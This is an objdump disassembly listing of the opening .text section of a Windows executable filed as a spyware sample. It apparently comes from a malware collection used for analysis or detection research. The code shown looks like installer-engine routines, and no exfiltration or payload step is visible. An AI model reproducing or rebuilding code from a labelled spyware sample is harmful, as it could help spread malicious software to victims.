
malware_samples/spyware/36b74c379e4cbff114a9eb4e60e5e729c793c5e9a7624808d1b428476e2deba9.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	8b ec                	mov    %esp,%ebp
  401003:	83 ec 5c             	sub    $0x5c,%esp
  401006:	83 7d 0c 0f          	cmpl   $0xf,0xc(%ebp)
  40100a:	74 2b                	je     0x401037
  40100c:	83 7d 0c 46          	cmpl   $0x46,0xc(%ebp)
  401010:	8b 45 14             	mov    0x14(%ebp),%eax
  401013:	75 0d                	jne    0x401022
  401015:	83 48 18 10          	orl    $0x10,0x18(%eax)
  401019:	8b 0d 08 92 42 00    	mov    0x429208,%ecx
  40101f:	89 48 04             	mov    %ecx,0x4(%eax)
  401022:	50                   	push   %eax
  401023:	ff 75 10             	push   0x10(%ebp)
  401026:	ff 75 0c             	push   0xc(%ebp)
  401029:	ff 75 08             	push   0x8(%ebp)
  40102c:	ff 15 24 72 40 00    	call   *0x407224
  401032:	e9 42 01 00 00       	jmp    0x401179
  401037:	53                   	push   %ebx
  401038:	56                   	push   %esi
  401039:	8b 35 10 92 42 00    	mov    0x429210,%esi
  40103f:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  401042:	57                   	push   %edi
  401043:	50                   	push   %eax
  401044:	ff 75 08             	push   0x8(%ebp)
  401047:	ff 15 28 72 40 00    	call   *0x407228
  40104d:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  401051:	89 45 0c             	mov    %eax,0xc(%ebp)
  401054:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401057:	50                   	push   %eax
  401058:	ff 75 08             	push   0x8(%ebp)
  40105b:	ff 15 2c 72 40 00    	call   *0x40722c
  401061:	8b 7d f0             	mov    -0x10(%ebp),%edi
  401064:	83 65 f0 00          	andl   $0x0,-0x10(%ebp)
  401068:	8b 1d 5c 70 40 00    	mov    0x40705c,%ebx
  40106e:	e9 80 00 00 00       	jmp    0x4010f3
  401073:	0f b6 46 52          	movzbl 0x52(%esi),%eax
  401077:	0f b6 56 56          	movzbl 0x56(%esi),%edx
  40107b:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  40107f:	8b cf                	mov    %edi,%ecx
  401081:	2b 4d e8             	sub    -0x18(%ebp),%ecx
  401084:	0f af c1             	imul   %ecx,%eax
  401087:	03 c2                	add    %edx,%eax
  401089:	89 4d 10             	mov    %ecx,0x10(%ebp)
  40108c:	99                   	cltd
  40108d:	f7 ff                	idiv   %edi
  40108f:	33 d2                	xor    %edx,%edx
  401091:	8a f0                	mov    %al,%dh
  401093:	0f b6 46 51          	movzbl 0x51(%esi),%eax
  401097:	0f af c1             	imul   %ecx,%eax
  40109a:	0f b6 4e 55          	movzbl 0x55(%esi),%ecx
  40109e:	0f af 4d e8          	imul   -0x18(%ebp),%ecx
  4010a2:	03 c1                	add    %ecx,%eax
  4010a4:	8b ca                	mov    %edx,%ecx
  4010a6:	99                   	cltd
  4010a7:	f7 ff                	idiv   %edi
  4010a9:	0f b6 56 54          	movzbl 0x54(%esi),%edx
  4010ad:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  4010b1:	8a c8                	mov    %al,%cl
  4010b3:	0f b6 46 50          	movzbl 0x50(%esi),%eax
  4010b7:	0f af 45 10          	imul   0x10(%ebp),%eax
  4010bb:	03 c2                	add    %edx,%eax
  4010bd:	99                   	cltd
  4010be:	f7 ff                	idiv   %edi
  4010c0:	c1 e1 08             	shl    $0x8,%ecx
  4010c3:	0f b6 c0             	movzbl %al,%eax
  4010c6:	0b c8                	or     %eax,%ecx
  4010c8:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4010cb:	50                   	push   %eax
  4010cc:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4010cf:	ff 15 64 70 40 00    	call   *0x407064
  4010d5:	83 45 f0 04          	addl   $0x4,-0x10(%ebp)
  4010d9:	89 45 14             	mov    %eax,0x14(%ebp)
  4010dc:	50                   	push   %eax
  4010dd:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4010e0:	50                   	push   %eax
  4010e1:	ff 75 0c             	push   0xc(%ebp)
  4010e4:	ff 15 30 72 40 00    	call   *0x407230
  4010ea:	ff 75 14             	push   0x14(%ebp)
  4010ed:	ff d3                	call   *%ebx
  4010ef:	83 45 e8 04          	addl   $0x4,-0x18(%ebp)
  4010f3:	39 7d e8             	cmp    %edi,-0x18(%ebp)
  4010f6:	0f 8c 77 ff ff ff    	jl     0x401073
  4010fc:	83 7e 58 ff          	cmpl   $0xffffffff,0x58(%esi)
  401100:	74 65                	je     0x401167
  401102:	ff 76 34             	push   0x34(%esi)
  401105:	ff 15 54 70 40 00    	call   *0x407054
  40110b:	85 c0                	test   %eax,%eax
  40110d:	89 45 14             	mov    %eax,0x14(%ebp)
  401110:	74 55                	je     0x401167
  401112:	8b 7d 0c             	mov    0xc(%ebp),%edi
  401115:	6a 01                	push   $0x1
  401117:	57                   	push   %edi
  401118:	c7 45 e4 10 00 00 00 	movl   $0x10,-0x1c(%ebp)
  40111f:	c7 45 e8 08 00 00 00 	movl   $0x8,-0x18(%ebp)
  401126:	ff 15 50 70 40 00    	call   *0x407050
  40112c:	ff 76 58             	push   0x58(%esi)
  40112f:	57                   	push   %edi
  401130:	ff 15 58 70 40 00    	call   *0x407058
  401136:	ff 75 14             	push   0x14(%ebp)
  401139:	8b 35 4c 70 40 00    	mov    0x40704c,%esi
  40113f:	57                   	push   %edi
  401140:	ff d6                	call   *%esi
  401142:	89 45 0c             	mov    %eax,0xc(%ebp)
  401145:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401148:	68 20 08 00 00       	push   $0x820
  40114d:	50                   	push   %eax
  40114e:	6a ff                	push   $0xffffffff
  401150:	68 00 82 42 00       	push   $0x428200
  401155:	57                   	push   %edi
  401156:	ff 15 88 72 40 00    	call   *0x407288
  40115c:	ff 75 0c             	push   0xc(%ebp)
  40115f:	57                   	push   %edi
  401160:	ff d6                	call   *%esi
  401162:	ff 75 14             	push   0x14(%ebp)
  401165:	ff d3                	call   *%ebx
  401167:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40116a:	50                   	push   %eax
  40116b:	ff 75 08             	push   0x8(%ebp)
  40116e:	ff 15 8c 72 40 00    	call   *0x40728c
  401174:	5f                   	pop    %edi
  401175:	5e                   	pop    %esi
  401176:	33 c0                	xor    %eax,%eax
  401178:	5b                   	pop    %ebx
  401179:	c9                   	leave
  40117a:	c2 10 00             	ret    $0x10
  40117d:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401181:	a1 28 92 42 00       	mov    0x429228,%eax
  401186:	8b d1                	mov    %ecx,%edx
  401188:	53                   	push   %ebx
  401189:	69 d2 18 08 00 00    	imul   $0x818,%edx,%edx
  40118f:	56                   	push   %esi
  401190:	57                   	push   %edi
  401191:	8b 54 02 08          	mov    0x8(%edx,%eax,1),%edx
  401195:	f6 c2 02             	test   $0x2,%dl
  401198:	74 4f                	je     0x4011e9
  40119a:	8d 71 01             	lea    0x1(%ecx),%esi
  40119d:	33 ff                	xor    %edi,%edi
  40119f:	3b 35 2c 92 42 00    	cmp    0x42922c,%esi
  4011a5:	73 42                	jae    0x4011e9
  4011a7:	8b ce                	mov    %esi,%ecx
  4011a9:	69 c9 18 08 00 00    	imul   $0x818,%ecx,%ecx
  4011af:	8d 44 01 08          	lea    0x8(%ecx,%eax,1),%eax
  4011b3:	8b 08                	mov    (%eax),%ecx
  4011b5:	f6 c1 02             	test   $0x2,%cl
  4011b8:	74 03                	je     0x4011bd
  4011ba:	47                   	inc    %edi
  4011bb:	eb 1e                	jmp    0x4011db
  4011bd:	f6 c1 04             	test   $0x4,%cl
  4011c0:	74 09                	je     0x4011cb
  4011c2:	8b cf                	mov    %edi,%ecx
  4011c4:	4f                   	dec    %edi
  4011c5:	85 c9                	test   %ecx,%ecx
  4011c7:	74 20                	je     0x4011e9
  4011c9:	eb 10                	jmp    0x4011db
  4011cb:	f6 c1 10             	test   $0x10,%cl
  4011ce:	75 0b                	jne    0x4011db
  4011d0:	8b d9                	mov    %ecx,%ebx
  4011d2:	33 da                	xor    %edx,%ebx
  4011d4:	83 e3 01             	and    $0x1,%ebx
  4011d7:	33 d9                	xor    %ecx,%ebx
  4011d9:	89 18                	mov    %ebx,(%eax)
  4011db:	46                   	inc    %esi
  4011dc:	05 18 08 00 00       	add    $0x818,%eax
  4011e1:	3b 35 2c 92 42 00    	cmp    0x42922c,%esi
  4011e7:	72 ca                	jb     0x4011b3
  4011e9:	5f                   	pop    %edi
  4011ea:	5e                   	pop    %esi
  4011eb:	5b                   	pop    %ebx
  4011ec:	c2 04 00             	ret    $0x4
  4011ef:	55                   	push   %ebp
  4011f0:	8b ec                	mov    %esp,%ebp
  4011f2:	51                   	push   %ecx
  4011f3:	51                   	push   %ecx
  4011f4:	8b 55 08             	mov    0x8(%ebp),%edx
  4011f7:	53                   	push   %ebx
  4011f8:	56                   	push   %esi
  4011f9:	8b f2                	mov    %edx,%esi
  4011fb:	69 f6 18 08 00 00    	imul   $0x818,%esi,%esi
  401201:	8b 1d 28 92 42 00    	mov    0x429228,%ebx
  401207:	33 c9                	xor    %ecx,%ecx
  401209:	03 f3                	add    %ebx,%esi
  40120b:	57                   	push   %edi
  40120c:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40120f:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  401212:	8b 46 08             	mov    0x8(%esi),%eax
  401215:	a8 02                	test   $0x2,%al
  401217:	74 0b                	je     0x401224
  401219:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
  40121c:	74 06                	je     0x401224
  40121e:	24 be                	and    $0xbe,%al
  401220:	42                   	inc    %edx
  401221:	89 46 08             	mov    %eax,0x8(%esi)
  401224:	3b 15 2c 92 42 00    	cmp    0x42922c,%edx
  40122a:	73 44                	jae    0x401270
  40122c:	8b c2                	mov    %edx,%eax
  40122e:	69 c0 18 08 00 00    	imul   $0x818,%eax,%eax
  401234:	8d 7c 18 08          	lea    0x8(%eax,%ebx,1),%edi
  401238:	8d 42 01             	lea    0x1(%edx),%eax
  40123b:	8b 0f                	mov    (%edi),%ecx
  40123d:	f6 c1 02             	test   $0x2,%cl
  401240:	74 0a                	je     0x40124c
  401242:	6a 01                	push   $0x1
  401244:	52                   	push   %edx
  401245:	e8 a5 ff ff ff       	call   0x4011ef
  40124a:	8b 0f                	mov    (%edi),%ecx
  40124c:	f6 c1 04             	test   $0x4,%cl
  40124f:	75 28                	jne    0x401279
  401251:	f6 c1 40             	test   $0x40,%cl
  401254:	74 03                	je     0x401259
  401256:	ff 45 fc             	incl   -0x4(%ebp)
  401259:	f6 c1 01             	test   $0x1,%cl
  40125c:	74 05                	je     0x401263
  40125e:	ff 45 fc             	incl   -0x4(%ebp)
  401261:	eb 03                	jmp    0x401266
  401263:	ff 45 f8             	incl   -0x8(%ebp)
  401266:	3b 05 2c 92 42 00    	cmp    0x42922c,%eax
  40126c:	8b d0                	mov    %eax,%edx
  40126e:	72 bc                	jb     0x40122c
  401270:	33 c0                	xor    %eax,%eax
  401272:	5f                   	pop    %edi
  401273:	5e                   	pop    %esi
  401274:	5b                   	pop    %ebx
  401275:	c9                   	leave
  401276:	c2 08 00             	ret    $0x8
  401279:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40127d:	74 f3                	je     0x401272
  40127f:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  401283:	74 06                	je     0x40128b
  401285:	83 4e 08 40          	orl    $0x40,0x8(%esi)
  401289:	eb e7                	jmp    0x401272
  40128b:	8b 4e 08             	mov    0x8(%esi),%ecx
  40128e:	80 e1 7f             	and    $0x7f,%cl
  401291:	83 c9 01             	or     $0x1,%ecx
  401294:	89 4e 08             	mov    %ecx,0x8(%esi)
  401297:	eb d9                	jmp    0x401272
  401299:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40129d:	a1 28 92 42 00       	mov    0x429228,%eax
  4012a2:	56                   	push   %esi
  4012a3:	33 f6                	xor    %esi,%esi
  4012a5:	83 f9 20             	cmp    $0x20,%ecx
  4012a8:	73 34                	jae    0x4012de
  4012aa:	39 35 2c 92 42 00    	cmp    %esi,0x42922c
  4012b0:	76 2c                	jbe    0x4012de
  4012b2:	8d 50 08             	lea    0x8(%eax),%edx
  4012b5:	57                   	push   %edi
  4012b6:	8b 02                	mov    (%edx),%eax
  4012b8:	a8 06                	test   $0x6,%al
  4012ba:	75 12                	jne    0x4012ce
  4012bc:	33 ff                	xor    %edi,%edi
  4012be:	47                   	inc    %edi
  4012bf:	d3 e7                	shl    %cl,%edi
  4012c1:	85 7a fc             	test   %edi,-0x4(%edx)
  4012c4:	74 04                	je     0x4012ca
  4012c6:	0c 01                	or     $0x1,%al
  4012c8:	eb 02                	jmp    0x4012cc
  4012ca:	24 fe                	and    $0xfe,%al
  4012cc:	89 02                	mov    %eax,(%edx)
  4012ce:	46                   	inc    %esi
  4012cf:	81 c2 18 08 00 00    	add    $0x818,%edx
  4012d5:	3b 35 2c 92 42 00    	cmp    0x42922c,%esi
  4012db:	72 d9                	jb     0x4012b6
  4012dd:	5f                   	pop    %edi
  4012de:	5e                   	pop    %esi
  4012df:	c2 04 00             	ret    $0x4
  4012e2:	55                   	push   %ebp
  4012e3:	8b ec                	mov    %esp,%ebp
  4012e5:	83 ec 0c             	sub    $0xc,%esp
  4012e8:	a1 10 92 42 00       	mov    0x429210,%eax
  4012ed:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4012f1:	53                   	push   %ebx
  4012f2:	56                   	push   %esi
  4012f3:	05 94 00 00 00       	add    $0x94,%eax
  4012f8:	57                   	push   %edi
  4012f9:	8b 3d 2c 92 42 00    	mov    0x42922c,%edi
  4012ff:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401302:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401305:	33 db                	xor    %ebx,%ebx
  401307:	39 18                	cmp    %ebx,(%eax)
  401309:	74 4b                	je     0x401356
  40130b:	3b df                	cmp    %edi,%ebx
  40130d:	73 45                	jae    0x401354
  40130f:	8b 35 28 92 42 00    	mov    0x429228,%esi
  401315:	83 c6 08             	add    $0x8,%esi
  401318:	8b 16                	mov    (%esi),%edx
  40131a:	f6 c2 06             	test   $0x6,%dl
  40131d:	75 28                	jne    0x401347
  40131f:	8b 45 08             	mov    0x8(%ebp),%eax
  401322:	85 c0                	test   %eax,%eax
  401324:	74 06                	je     0x40132c
  401326:	83 3c 98 00          	cmpl   $0x0,(%eax,%ebx,4)
  40132a:	74 1b                	je     0x401347
  40132c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40132f:	33 c0                	xor    %eax,%eax
  401331:	40                   	inc    %eax
  401332:	83 e2 01             	and    $0x1,%edx
  401335:	d3 e0                	shl    %cl,%eax
  401337:	8b 4e fc             	mov    -0x4(%esi),%ecx
  40133a:	23 c8                	and    %eax,%ecx
  40133c:	8b c1                	mov    %ecx,%eax
  40133e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401341:	d3 e2                	shl    %cl,%edx
  401343:	3b c2                	cmp    %edx,%eax
  401345:	75 0b                	jne    0x401352
  401347:	43                   	inc    %ebx
  401348:	81 c6 18 08 00 00    	add    $0x818,%esi
  40134e:	3b df                	cmp    %edi,%ebx
  401350:	72 c6                	jb     0x401318
  401352:	3b df                	cmp    %edi,%ebx
  401354:	74 0d                	je     0x401363
  401356:	ff 45 fc             	incl   -0x4(%ebp)
  401359:	83 45 f8 04          	addl   $0x4,-0x8(%ebp)
  40135d:	83 7d fc 20          	cmpl   $0x20,-0x4(%ebp)
  401361:	72 9f                	jb     0x401302
  401363:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401366:	5f                   	pop    %edi
  401367:	5e                   	pop    %esi
  401368:	5b                   	pop    %ebx
  401369:	c9                   	leave
  40136a:	c2 04 00             	ret    $0x4
  40136d:	8b 44 24 04          	mov    0x4(%esp),%eax
  401371:	85 c0                	test   %eax,%eax
  401373:	7d 11                	jge    0x401386
  401375:	40                   	inc    %eax
  401376:	b9 00 a0 42 00       	mov    $0x42a000,%ecx
  40137b:	c1 e0 0b             	shl    $0xb,%eax
  40137e:	2b c8                	sub    %eax,%ecx
  401380:	51                   	push   %ecx
  401381:	e8 f4 4b 00 00       	call   0x405f7a
  401386:	c2 04 00             	ret    $0x4
  401389:	56                   	push   %esi
  40138a:	8b 74 24 08          	mov    0x8(%esp),%esi
  40138e:	eb 6a                	jmp    0x4013fa
  401390:	8b c6                	mov    %esi,%eax
  401392:	8b 0d 30 92 42 00    	mov    0x429230,%ecx
  401398:	6b c0 1c             	imul   $0x1c,%eax,%eax
  40139b:	03 c1                	add    %ecx,%eax
  40139d:	83 38 01             	cmpl   $0x1,(%eax)
  4013a0:	74 5c                	je     0x4013fe
  4013a2:	50                   	push   %eax
  4013a3:	e8 8c 00 00 00       	call   0x401434
  4013a8:	3d ff ff ff 7f       	cmp    $0x7fffffff,%eax
  4013ad:	74 55                	je     0x401404
  4013af:	50                   	push   %eax
  4013b0:	e8 b8 ff ff ff       	call   0x40136d
  4013b5:	85 c0                	test   %eax,%eax
  4013b7:	75 04                	jne    0x4013bd
  4013b9:	40                   	inc    %eax
  4013ba:	46                   	inc    %esi
  4013bb:	eb 07                	jmp    0x4013c4
  4013bd:	48                   	dec    %eax
  4013be:	8b ce                	mov    %esi,%ecx
  4013c0:	8b f0                	mov    %eax,%esi
  4013c2:	2b c1                	sub    %ecx,%eax
  4013c4:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  4013c9:	74 2f                	je     0x4013fa
  4013cb:	01 05 ec 81 42 00    	add    %eax,0x4281ec
  4013d1:	6a 00                	push   $0x0
  4013d3:	ff 35 d4 81 42 00    	push   0x4281d4
  4013d9:	68 30 75 00 00       	push   $0x7530
  4013de:	ff 35 ec 81 42 00    	push   0x4281ec
  4013e4:	ff 15 54 71 40 00    	call   *0x407154
  4013ea:	50                   	push   %eax
  4013eb:	68 02 04 00 00       	push   $0x402
  4013f0:	ff 74 24 18          	push   0x18(%esp)
  4013f4:	ff 15 20 72 40 00    	call   *0x407220
  4013fa:	85 f6                	test   %esi,%esi
  4013fc:	7d 92                	jge    0x401390
  4013fe:	33 c0                	xor    %eax,%eax
  401400:	5e                   	pop    %esi
  401401:	c2 08 00             	ret    $0x8
  401404:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  401409:	eb f5                	jmp    0x401400
  40140b:	8b 44 24 04          	mov    0x4(%esp),%eax
  40140f:	8b 0d 10 92 42 00    	mov    0x429210,%ecx
  401415:	6a 00                	push   $0x0
  401417:	ff 74 81 6c          	push   0x6c(%ecx,%eax,4)
  40141b:	e8 69 ff ff ff       	call   0x401389
  401420:	c2 04 00             	ret    $0x4
  401423:	68 a8 9d 40 00       	push   $0x409da8
  401428:	ff 74 24 08          	push   0x8(%esp)
  40142c:	e8 48 3d 00 00       	call   0x405179
  401431:	c2 04 00             	ret    $0x4
  401434:	55                   	push   %ebp
  401435:	8b ec                	mov    %esp,%ebp
  401437:	81 ec b0 02 00 00    	sub    $0x2b0,%esp
  40143d:	53                   	push   %ebx
  40143e:	56                   	push   %esi
  40143f:	8b 75 08             	mov    0x8(%ebp),%esi
  401442:	57                   	push   %edi
  401443:	a1 08 92 42 00       	mov    0x429208,%eax
  401448:	6a 07                	push   $0x7
  40144a:	59                   	pop    %ecx
  40144b:	8d 7d d0             	lea    -0x30(%ebp),%edi
  40144e:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401450:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  401453:	8b 55 d0             	mov    -0x30(%ebp),%edx
  401456:	bf 00 a0 42 00       	mov    $0x42a000,%edi
  40145b:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40145e:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  401461:	33 db                	xor    %ebx,%ebx
  401463:	c1 e1 0b             	shl    $0xb,%ecx
  401466:	03 cf                	add    %edi,%ecx
  401468:	8b f0                	mov    %eax,%esi
  40146a:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  40146d:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  401470:	c1 e6 0b             	shl    $0xb,%esi
  401473:	89 0d a8 bd 40 00    	mov    %ecx,0x40bda8
  401479:	8d 4a fe             	lea    -0x2(%edx),%ecx
  40147c:	03 f7                	add    %edi,%esi
  40147e:	83 f9 43             	cmp    $0x43,%ecx
  401481:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  401484:	0f 87 c2 15 00 00    	ja     0x402a4c
  40148a:	ff 24 8d 5e 2a 40 00 	jmp    *0x402a5e(,%ecx,4)
  401491:	53                   	push   %ebx
  401492:	50                   	push   %eax
  401493:	e8 e1 3c 00 00       	call   0x405179
  401498:	e9 eb 0d 00 00       	jmp    0x402288
  40149d:	ff 05 cc 81 42 00    	incl   0x4281cc
  4014a3:	39 5d f4             	cmp    %ebx,-0xc(%ebp)
  4014a6:	0f 84 dc 0d 00 00    	je     0x402288
  4014ac:	53                   	push   %ebx
  4014ad:	ff 15 64 72 40 00    	call   *0x407264
  4014b3:	e9 d0 0d 00 00       	jmp    0x402288
  4014b8:	50                   	push   %eax
  4014b9:	e8 af fe ff ff       	call   0x40136d
  4014be:	48                   	dec    %eax
  4014bf:	53                   	push   %ebx
  4014c0:	50                   	push   %eax
  4014c1:	e8 c3 fe ff ff       	call   0x401389
  4014c6:	e9 8c 15 00 00       	jmp    0x402a57
  4014cb:	53                   	push   %ebx
  4014cc:	50                   	push   %eax
  4014cd:	e8 a7 3c 00 00       	call   0x405179
  4014d2:	e9 75 15 00 00       	jmp    0x402a4c
  4014d7:	53                   	push   %ebx
  4014d8:	e8 c5 16 00 00       	call   0x402ba2
  4014dd:	83 f8 01             	cmp    $0x1,%eax
  4014e0:	7f 03                	jg     0x4014e5
  4014e2:	33 c0                	xor    %eax,%eax
  4014e4:	40                   	inc    %eax
  4014e5:	50                   	push   %eax
  4014e6:	ff 15 7c 70 40 00    	call   *0x40707c
  4014ec:	e9 5b 15 00 00       	jmp    0x402a4c
  4014f1:	ff 75 f4             	push   -0xc(%ebp)
  4014f4:	ff 15 98 72 40 00    	call   *0x407298
  4014fa:	e9 4d 15 00 00       	jmp    0x402a4c
  4014ff:	c1 e0 02             	shl    $0x2,%eax
  401502:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  401505:	75 22                	jne    0x401529
  401507:	8b 88 80 92 42 00    	mov    0x429280(%eax),%ecx
  40150d:	6a 01                	push   $0x1
  40150f:	89 88 c0 92 42 00    	mov    %ecx,0x4292c0(%eax)
  401515:	e8 88 16 00 00       	call   0x402ba2
  40151a:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  40151d:	89 04 8d 80 92 42 00 	mov    %eax,0x429280(,%ecx,4)
  401524:	e9 23 15 00 00       	jmp    0x402a4c
  401529:	8b 88 c0 92 42 00    	mov    0x4292c0(%eax),%ecx
  40152f:	89 88 80 92 42 00    	mov    %ecx,0x429280(%eax)
  401535:	e9 12 15 00 00       	jmp    0x402a4c
  40153a:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40153d:	8d 34 85 80 92 42 00 	lea    0x429280(,%eax,4),%esi
  401544:	33 c0                	xor    %eax,%eax
  401546:	8b 0e                	mov    (%esi),%ecx
  401548:	3b cb                	cmp    %ebx,%ecx
  40154a:	0f 94 c0             	sete   %al
  40154d:	23 4d e0             	and    -0x20(%ebp),%ecx
  401550:	8b 44 85 d4          	mov    -0x2c(%ebp,%eax,4),%eax
  401554:	89 0e                	mov    %ecx,(%esi)
  401556:	e9 fc 14 00 00       	jmp    0x402a57
  40155b:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40155e:	ff 34 85 80 92 42 00 	push   0x429280(,%eax,4)
  401565:	56                   	push   %esi
  401566:	e9 87 14 00 00       	jmp    0x4029f2
  40156b:	8b 0d d0 81 42 00    	mov    0x4281d0,%ecx
  401571:	8b 35 68 72 40 00    	mov    0x407268,%esi
  401577:	3b cb                	cmp    %ebx,%ecx
  401579:	74 09                	je     0x401584
  40157b:	ff 75 d8             	push   -0x28(%ebp)
  40157e:	51                   	push   %ecx
  40157f:	ff d6                	call   *%esi
  401581:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  401584:	8b 0d e4 81 42 00    	mov    0x4281e4,%ecx
  40158a:	3b cb                	cmp    %ebx,%ecx
  40158c:	0f 84 ba 14 00 00    	je     0x402a4c
  401592:	50                   	push   %eax
  401593:	51                   	push   %ecx
  401594:	ff d6                	call   *%esi
  401596:	e9 b1 14 00 00       	jmp    0x402a4c
  40159b:	6a f0                	push   $0xfffffff0
  40159d:	e8 1d 16 00 00       	call   0x402bbf
  4015a2:	ff 75 d8             	push   -0x28(%ebp)
  4015a5:	50                   	push   %eax
  4015a6:	ff 15 90 70 40 00    	call   *0x407090
  4015ac:	85 c0                	test   %eax,%eax
  4015ae:	0f 85 98 14 00 00    	jne    0x402a4c
  4015b4:	e9 65 12 00 00       	jmp    0x40281e
  4015b9:	6a f0                	push   $0xfffffff0
  4015bb:	e8 ff 15 00 00       	call   0x402bbf
  4015c0:	50                   	push   %eax
  4015c1:	89 45 08             	mov    %eax,0x8(%ebp)
  4015c4:	e8 b0 44 00 00       	call   0x405a79
  4015c9:	8b f0                	mov    %eax,%esi
  4015cb:	3b f3                	cmp    %ebx,%esi
  4015cd:	74 5a                	je     0x401629
  4015cf:	6a 5c                	push   $0x5c
  4015d1:	56                   	push   %esi
  4015d2:	e8 24 44 00 00       	call   0x4059fb
  4015d7:	8b f0                	mov    %eax,%esi
  4015d9:	66 8b 3e             	mov    (%esi),%di
  4015dc:	66 89 1e             	mov    %bx,(%esi)
  4015df:	66 3b fb             	cmp    %bx,%di
  4015e2:	75 18                	jne    0x4015fc
  4015e4:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  4015e7:	74 13                	je     0x4015fc
  4015e9:	e8 f4 40 00 00       	call   0x4056e2
  4015ee:	85 c0                	test   %eax,%eax
  4015f0:	74 0a                	je     0x4015fc
  4015f2:	ff 75 08             	push   0x8(%ebp)
  4015f5:	e8 4e 40 00 00       	call   0x405648
  4015fa:	eb 08                	jmp    0x401604
  4015fc:	ff 75 08             	push   0x8(%ebp)
  4015ff:	e8 c1 40 00 00       	call   0x4056c5
  401604:	3b c3                	cmp    %ebx,%eax
  401606:	74 17                	je     0x40161f
  401608:	3d b7 00 00 00       	cmp    $0xb7,%eax
  40160d:	75 0d                	jne    0x40161c
  40160f:	ff 75 08             	push   0x8(%ebp)
  401612:	ff 15 74 70 40 00    	call   *0x407074
  401618:	a8 10                	test   $0x10,%al
  40161a:	75 03                	jne    0x40161f
  40161c:	ff 45 fc             	incl   -0x4(%ebp)
  40161f:	66 89 3e             	mov    %di,(%esi)
  401622:	46                   	inc    %esi
  401623:	46                   	inc    %esi
  401624:	66 3b fb             	cmp    %bx,%di
  401627:	75 a6                	jne    0x4015cf
  401629:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  40162c:	74 2d                	je     0x40165b
  40162e:	6a e6                	push   $0xffffffe6
  401630:	e8 ee fd ff ff       	call   0x401423
  401635:	ff 75 08             	push   0x8(%ebp)
  401638:	68 00 50 43 00       	push   $0x435000
  40163d:	e8 d8 49 00 00       	call   0x40601a
  401642:	ff 75 08             	push   0x8(%ebp)
  401645:	ff 15 70 70 40 00    	call   *0x407070
  40164b:	85 c0                	test   %eax,%eax
  40164d:	0f 85 f9 13 00 00    	jne    0x402a4c
  401653:	ff 45 fc             	incl   -0x4(%ebp)
  401656:	e9 f1 13 00 00       	jmp    0x402a4c
  40165b:	6a f5                	push   $0xfffffff5
  40165d:	e9 7a 0b 00 00       	jmp    0x4021dc
  401662:	53                   	push   %ebx
  401663:	e8 57 15 00 00       	call   0x402bbf
  401668:	50                   	push   %eax
  401669:	e8 ef 4c 00 00       	call   0x40635d
  40166e:	e9 3d 06 00 00       	jmp    0x401cb0
  401673:	6a d0                	push   $0xffffffd0
  401675:	e8 45 15 00 00       	call   0x402bbf
  40167a:	6a df                	push   $0xffffffdf
  40167c:	8b f0                	mov    %eax,%esi
  40167e:	e8 3c 15 00 00       	call   0x402bbf
  401683:	6a 13                	push   $0x13
  401685:	8b f8                	mov    %eax,%edi
  401687:	e8 33 15 00 00       	call   0x402bbf
  40168c:	57                   	push   %edi
  40168d:	56                   	push   %esi
  40168e:	ff 15 8c 70 40 00    	call   *0x40708c
  401694:	85 c0                	test   %eax,%eax
  401696:	74 07                	je     0x40169f
  401698:	6a e3                	push   $0xffffffe3
  40169a:	e9 3d 0b 00 00       	jmp    0x4021dc
  40169f:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  4016a2:	0f 84 76 11 00 00    	je     0x40281e
  4016a8:	56                   	push   %esi
  4016a9:	e8 af 4c 00 00       	call   0x40635d
  4016ae:	85 c0                	test   %eax,%eax
  4016b0:	0f 84 68 11 00 00    	je     0x40281e
  4016b6:	57                   	push   %edi
  4016b7:	56                   	push   %esi
  4016b8:	e8 fe 47 00 00       	call   0x405ebb
  4016bd:	6a e4                	push   $0xffffffe4
  4016bf:	e9 18 0b 00 00       	jmp    0x4021dc
  4016c4:	53                   	push   %ebx
  4016c5:	e8 f5 14 00 00       	call   0x402bbf
  4016ca:	8b 7d f0             	mov    -0x10(%ebp),%edi
  4016cd:	8b f0                	mov    %eax,%esi
  4016cf:	8d 45 08             	lea    0x8(%ebp),%eax
  4016d2:	50                   	push   %eax
  4016d3:	57                   	push   %edi
  4016d4:	68 00 04 00 00       	push   $0x400
  4016d9:	56                   	push   %esi
